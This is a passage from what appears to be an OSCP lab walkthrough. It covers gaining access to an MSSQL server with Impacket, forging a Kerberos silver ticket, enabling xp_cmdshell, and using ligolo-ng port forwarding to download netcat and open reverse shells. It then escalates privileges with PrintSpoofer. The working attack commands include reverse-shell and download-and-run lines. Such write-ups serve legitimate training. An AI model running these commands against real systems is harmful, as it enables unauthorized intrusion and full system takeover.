## Foothold



### MSSQL Access

The combination of port 1433 being open and me having found access to the OSCP\sql\_svc account leads me to believe I should work here.

I use Impacket's MSSQLClient to access the server:

{% code overflow="wrap" %}
```bash
impacket-mssqlclient oscp.exam/sql_svc:Dolphin1@ms02.oscp.exam -windows-auth
```
{% endcode %}

The `-windows-auth flag` is used to correct the "TLS Required" and then exit errors seen in the first attempt in the screenshot below. This technique was demonstrated in the [Nagoya lab](../../../practice-labs/windows/nagoya.md#accessing-mssql):

### Silver Ticket

I will again be loosely following the procedures laid out in the [Nagoya lab](../../../practice-labs/windows/nagoya.md#silver-ticket). I will attempt to create a silver ticket for the MSSQL service as the Administrator. That should allow me to use xp\_cmdshell to get access to the system. To obtain the silver ticket I need:

1. Domain SID
2. MSSQL's SPN

#### Domain SID

I use `PowerView`'s `Get-DomainSID` cmdlet to get the domain's SID. I was running this command from the `evil-winrm` on `MS01` as `MS01\Administrator` at first. It was erroring and then I realized it was because that was not a domain-connected account. Once I added some credentials for a domain user it worked fine:



#### MSSQL's SPN

This I just find in BloodHound:



#### Impacket Ticketer

I can then obtain a silver ticket using Impacket's [Ticketer](https://github.com/fortra/impacket/blob/master/examples/ticketer.py). The command seems like it can be used with a password but in reality it requires an NTLM hash provided with `-nthash`. I just use [this](https://codebeautify.org/ntlm-hash-generator) online hash generator to convert Diamond1 to an NTLM hash:

{% code overflow="wrap" %}
```bash
impacket-ticketer -domain 'oscp.exam' -domain-sid 'S-1-5-21-2610934713-1581164095-2706428072' -spn 'MSSQL/MS02.oscp.exam' -nthash 469F1D2796CF71FB9B1A28FE2545CA35 -dc-ip 10.10.119.146 Administrator
```
{% endcode %}

This saves the output to `Administrator.ccache`:

I should have thought of trying this the first time but the whole point of the silver ticket was to run the `enable xp_cmdshell` command to allow execution on the system. Maybe `sql_svc` can run that command. I sign back in as `sql_svc` and attempt to run the command. It succeeds:



Now I have basic code execution on the system. It is simply a question of turning this to a shell.

### Reverse Shell

First of all I will need some [port forwarding set up](../../../attack-vectors/port-forwarding-and-tunneling/ligolo-ng.md#port-forwarding) in `ligolo-ng`. I need to be able to reach my HTTP server at port 80 on my machine. I will also need to be able to reach whatever port I choose for my listener so I need to set those up with `ligolo-ng`. Both of these commands are run in the `ligolo-ng` `proxy` session on my machine:

```
listener_add --addr 0.0.0.0:81 --to 192.168.45.154:80
```

```
listener_add --addr 0.0.0.0:555 --to 192.168.45.154:4444
```

* I realize I likely have a lot of latitude in port selection. `MS01` is the pivot machine and seems to have pretty free reign to connect. Most OSCP networks do not have any or a lot of internal port limitations so 555 is likely a safe choice.

These listeners will forward traffic received at MS01's ports 81 and 555 (all interfaces) and forward it to ports 80 and 4444 on my machine respectively.

Once this is setup, I then just download Netcat from my HTTP server via the forwarder at `MS01`'s port 81 and run a reverse shell through the forwarder at port 555:

{% code overflow="wrap" %}
```
curl.exe http://10.10.119.147:81/windows/exe/networking/netcat_x64.exe -o C:\Windows\Temp\nc.exe
```
{% endcode %}

{% code overflow="wrap" %}
```
C:\Windows\Temp\nc.exe -e cmd.exe 10.10.119.147 555
```
{% endcode %}



User access achieved.

## Privilege Escalation

User has `SeImpersonatePrivilege` so I try `PrintSpoofer` first. First I download it with `curl.exe`:

{% code overflow="wrap" %}
```
curl.exe http://10.10.119.147:81/windows/exe/privesc/PrintSpoofer64.exe -o C:\Windows\Temp\PrintSpoofer.exe
```
{% endcode %}

First I need to open a new `ligolo-ng` listener, and then I can run `PrintSpoofer` with a Netcat command:

{% code overflow="wrap" %}
```
listener_add --addr 0.0.0.0:556 --to 192.168.45.154:4455
```
{% endcode %}

* Command is run in `ligolo-ng` `proxy` session on my machine
* Forwards traffic from `MS01`'s port 556 (all interfaces) to my machine's port 4455 where I set up a Netcat listener (`nc -lvnp 4455`)

{% code overflow="wrap" %}
```
C:\Windows\Temp\PrintSpoofer.exe -c 'C:\Windows\Temp\nc.exe -e cmd.exe 10.10.119.147 556'
```
{% endcode %}

It works:
